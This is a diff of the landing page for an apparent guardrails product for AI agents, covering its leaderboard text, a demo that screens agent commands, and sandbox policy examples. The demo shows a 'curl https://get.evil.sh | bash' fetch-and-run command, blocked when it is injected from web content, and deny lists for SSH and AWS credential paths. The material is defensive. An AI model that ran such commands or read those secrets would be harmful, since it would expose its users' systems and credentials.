@@ -12,9 +12,9 @@ const NAV = [
   { label: "GitHub", href: GH },
 ];
 
-const FLOW = `   agents ─┐                                    ┌─ detectors (config OR model)
-  sandboxes ├──▶  GuardEvent · Verdict ·        ◀─┤   ranked on the leaderboard
-  LLM proto ┘     provenance · composition        └─ your own rules`;
+const FLOW = `   agents ─┐                                 ┌─ detectors (config OR model)
+sandboxes ─┼──▶  GuardEvent · Verdict ·   ◀──┼─ ranked on the leaderboard
+LLM proto ─┘     provenance · composition    └─ your own rules`;
 
 function Header() {
   return (
@@ -218,7 +218,6 @@ function Altitudes() {
     {
       n: "03",
       tag: "Gateway",
-      badge: "New",
       where: "intercepts at the LLM protocol",
       scenario: "You're running an LLM gateway",
       blurb:
@@ -331,10 +330,10 @@ function Leaderboard() {
         </div>
         <div className="card p-4">
           <span className="text-accent font-semibold">Composition beats its parts.</span>{" "}
-          <span className="text-zinc-400">config⊕llm reaches macro 0.588 — above config (0.438) and
-          llm (0.380) alone. keyword and block-all top macro on seed-v0 only because the seed is
-          small and signature-heavy; now that the obfuscated AMOS-style cases are in, closing the
-          recall gap on evasive commands is what&apos;s next.</span>
+          <span className="text-zinc-400">config⊕llm tops the board at macro 0.641 — above config
+          (0.491) and llm (0.380) alone. The signature baselines that looked competitive on simple
+          commands fall behind once the obfuscated AMOS-style cases are in the seed and the rules
+          learn to catch them.</span>
         </div>
       </div>
       <p className="mt-4 text-xs text-zinc-500">
@@ -376,10 +375,16 @@ function Proof() {
   return (
     <section className="container-x py-16">
       <p className="eyebrow mb-3">Proof it runs</p>
-      <h2 className="text-3xl sm:text-4xl font-bold mb-6">
+      <h2 className="text-3xl sm:text-4xl font-bold mb-4">
         A Hermes agent + sandbox, secured through OGR
       </h2>
-      <div className="codeblock">{`$ python3 demo.py        # config ⊕ LLM guardrails, composed
+      <p className="text-zinc-400 max-w-2xl mb-8">
+        One runtime, one policy model. Provenance flips the decision at the agent hook, and the same{" "}
+        <span className="font-mono">guard_id</span> lets the sandbox tighten what the hook allowed —
+        then the one <span className="font-mono">sandbox</span> block compiles to a personal laptop
+        or a multi-tenant fleet.
+      </p>
+      <div className="codeblock mb-10">{`$ python3 demo.py        # config ⊕ LLM guardrails, composed
 
 A. ls -la                         [trusted]            ✅ allow
 B. curl https://get.evil.sh | bash [web/UNTRUSTED]     ⛔ block   (prompt_injection)
@@ -387,87 +392,23 @@ C. curl https://get.evil.sh | bash [trusted user]      ⛔ require_approval
    ↳ provenance flips the LLM judge: B=block vs C=approval
 D. bash deploy.sh → sandbox sees AWS_SECRET_ACCESS_KEY ⛔ require_approval
    ↳ same guard_id: the sandbox tightens what the hook allowed`}</div>
-      <a href={`${GH}/openguardrails-poc`} className="inline-block mt-6 text-accent text-sm font-semibold hover:underline">
-        Run it yourself → openguardrails-poc
-      </a>
-    </section>
-  );
-}
 
-function Integrations() {
-  return (
-    <section className="container-x py-16">
-      <p className="eyebrow mb-3">Reference integration · Hermes</p>
-      <h2 className="text-3xl sm:text-4xl font-bold mb-4">
-        From personal assistant to multi-tenant agent
-      </h2>
-      <p className="text-zinc-400 max-w-2xl mb-4">
-        <span className="text-zinc-200 font-semibold">On Claude Code?</span> Install the OGR
-        plugin and risky tool calls — <span className="font-mono">curl | bash</span>, obfuscated
-        execs, non-allowlisted egress, credential reads — are denied before they run,{" "}
-        <span className="text-zinc-200">even in bypass mode</span>.{" "}
-        <a href="/docs/integrations/claude-code/" className="text-accent font-semibold hover:underline">
-          Claude Code integration →
-        </a>
-      </p>
-      <p className="text-zinc-400 max-w-2xl mb-9">
-        Or run Hermes as your own assistant, or as a shared agent many tenants use. These are
-        different security <span className="text-zinc-200">and</span> infrastructure problems —
-        <span className="font-mono"> srt</span> for the personal laptop,
-        <span className="font-mono"> OpenShell</span> for the multi-tenant gateway. OGR is how you
-        configure guardrails for both: one policy model that compiles to either backend — so you
-        express security as policy, not as srt profiles and Rego by hand. The policies differ; the
-        way you write them doesn&apos;t.
-      </p>
-
-      <div className="grid md:grid-cols-2 gap-5 mb-8">
-        <div className="card p-7">
-          <div className="flex items-center justify-between mb-3">
-            <h3 className="text-lg font-semibold">Personal assistant</h3>
-            <span className="text-xs rounded-full px-2.5 py-0.5 bg-accent/10 border border-accent/20 text-accent">Hermes + srt</span>
-          </div>
-          <p className="text-sm text-zinc-400 leading-relaxed mb-4">
-            You, on your own machine. Containerless OS-level isolation
-            (<span className="font-mono">sandbox-exec</span> / <span className="font-mono">bubblewrap</span>),
-            no Docker. You trust the workload — you don&apos;t trust what it just read.
-            The policy guards <span className="text-zinc-300">your</span> files, secrets, and network.
-          </p>
-          <a href="/docs/integrations/hermes-srt/" className="text-accent text-sm font-semibold hover:underline">
-            Read the personal guide →
-          </a>
-        </div>
-        <div className="card p-7">
-          <div className="flex items-center justify-between mb-3">
-            <h3 className="text-lg font-semibold">Multi-tenant agent</h3>
-            <span className="text-xs rounded-full px-2.5 py-0.5 bg-white/5 border border-white/10 text-zinc-400">Hermes + OpenShell</span>
-          </div>
-          <p className="text-sm text-zinc-400 leading-relaxed mb-4">
-            Many tenants, one shared service. Hard container isolation per tenant, a central egress
-            proxy and audit. You trust neither the tenants nor the workloads — so the policy is
-            stricter: deny-by-default, no host filesystem, hard per-tenant limits.
-          </p>
-          <a href="/docs/integrations/hermes-openshell/" className="text-accent text-sm font-semibold hover:underline">
-            Read the team guide →
-          </a>
-        </div>
-      </div>
-
-      <p className="text-xs font-semibold uppercase tracking-[0.2em] text-zinc-500 mb-2">
+      <p className="text-xs font-semibold uppercase tracking-[0.2em] text-zinc-500 mb-3">
         Same OGR model · different policy
       </p>
       <div className="grid lg:grid-cols-2 gap-5 items-start">
         <div>
-          <div className="codeblock">{`"sandbox": {                 // personal
+          <div className="codeblock">{`"sandbox": {                 // personal · srt
   "workspace_write":  ["."],
   "deny_read":        ["~/.ssh", "~/.aws",
                        "~/.hermes/auth.json"],
   "egress_allowlist": ["api.github.com",
                        "pypi.org"]
 }`}</div>
-          <p className="mt-2 text-xs text-zinc-500">→ compiles to srt settings</p>
+          <p className="mt-2 text-xs text-zinc-500">→ compiles to srt settings (OS-level, no Docker)</p>
         </div>
         <div>
-          <div className="codeblock">{`"sandbox": {                 // multi-tenant
+          <div className="codeblock">{`"sandbox": {                 // multi-tenant · OpenShell
   "workspace_write":  ["/workspace"],   // no host FS
   "deny_read":        ["/etc", "**/secrets/**"],
   "egress_allowlist": ["api.internal.corp"],
@@ -478,34 +419,16 @@ function Integrations() {
         </div>
       </div>
       <p className="mt-4 text-sm text-zinc-400 max-w-2xl">
-        Different deployments, different threat models, different policy — but written once, in the
-        OGR model, instead of learning srt&apos;s JSON for the laptop and Rego for the cluster.
-      </p>
-
-      <p className="mt-9 text-xs font-semibold uppercase tracking-[0.2em] text-zinc-500 mb-2">
-        Personal, enforced at the OS — for real
-      </p>
-      <div className="codeblock max-w-2xl">{`$ python3 demo_srt.py     # Hermes + srt, via OGR
-
-✓ benign            ALLOWED  (echo)            rc=0
-✓ secret-read (cat) BLOCKED  Operation not permitted
-✓ secret-read (py)  BLOCKED  PermissionError  ← rephrase
-✓ egress blocked    BLOCKED  example.com (403)
-✓ egress allowed    ALLOWED  api.github.com (200)`}</div>
-      <p className="mt-2 text-xs text-zinc-500 max-w-2xl">
-        Reader-agnostic: srt blocks the <span className="font-mono">open()</span> whether the agent
-        uses <span className="font-mono">cat</span> or <span className="font-mono">python</span>.
+        Same fields, two threat models — written once in the OGR model instead of srt JSON for the
+        laptop and Rego for the cluster.
       </p>
 
       <div className="mt-8 flex flex-wrap items-center gap-3">
-        <a href="/docs/integrations/" className="rounded-lg px-5 py-3 bg-accent text-ink font-semibold hover:bg-blue-300 transition">
+        <a href={`${GH}/openguardrails-poc`} className="rounded-lg px-5 py-3 bg-accent text-ink font-semibold hover:bg-blue-300 transition">
+          Run the PoC →
+        </a>
+        <a href="/docs/integrations/" className="rounded-lg px-5 py-3 border border-white/15 font-semibold hover:bg-white/5 transition">
           Explore integrations
-        </a>
-        <a href="/docs/getting-started/" className="rounded-lg px-5 py-3 border border-white/15 font-semibold hover:bg-white/5 transition">
-          Getting started
-        </a>
-        <a href={`${GH}/openguardrails-poc`} className="rounded-lg px-5 py-3 border border-white/15 font-semibold hover:bg-white/5 transition">
-          Source on GitHub
         </a>
       </div>
     </section>
@@ -571,7 +494,6 @@ export default function Page() {
       <Leaderboard />
       <TwoSides />
       <Proof />
-      <Integrations />
       <Footer />
     </main>
   );
